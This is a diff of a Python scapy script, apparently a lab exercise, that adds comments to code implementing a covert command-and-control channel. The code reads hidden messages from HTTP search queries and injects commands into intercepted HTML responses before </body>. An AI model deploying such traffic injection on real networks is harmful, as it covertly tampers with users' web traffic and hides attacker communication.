@@ -9,6 +9,8 @@ COVERT_CMD = "pong!"
 injected_streams = set()
 
 def inject_command(payload, command):
+    # Inject the message to send back to the client by adding in the comment C2CMD
+    #  Into the portion of the html file just before the body.
     try:
         html = payload.decode(errors="ignore")
         if "</body>" in html:
@@ -18,9 +20,10 @@ def inject_command(payload, command):
         return payload
 
 def extract_covert_message(payload):
+    # Extract the message from the search result sent from client by using regex 
+    # to obtain the specific words from the last component of the search
     try:
         data = payload.decode(errors="ignore")
-        # Match: GET /search?q=What+is+<message>+? HTTP/1.1
         match = re.search(r"GET /search\?q=What\+is\+([^\+]+)\+\?", data)
         if match:
             covert_message = match.group(1)
@@ -31,7 +34,7 @@ def extract_covert_message(payload):
 def process_packet(pkt):
     scapy_pkt = IP(pkt.get_payload())
 
-    if scapy_pkt.haslayer(TCP):
+    if scapy_pkt.haslayer(TCP): #Use scapy to find which packets are useful
         tcp = scapy_pkt[TCP]
         stream_id = (scapy_pkt[IP].src, tcp.sport, scapy_pkt[IP].dst, tcp.dport)
 
@@ -49,13 +52,11 @@ def process_packet(pkt):
             if tcp.dport == 80 and TARGET_HOST in raw_load:
                 extract_covert_message(raw_load)
 
-            
             if tcp.sport == 80:
                 print(f"[DEBUG] HTTP response packet size: {len(raw_load)}", flush=True)
             if b"</body>" in raw_load:
                 print("[DEBUG] Found </body> marker!", flush=True)
 
-            
             # Inbound HTTP response: inject only once per TCP stream
             if tcp.sport == 80 and stream_id not in injected_streams:
                 if b"</body>" in raw_load:
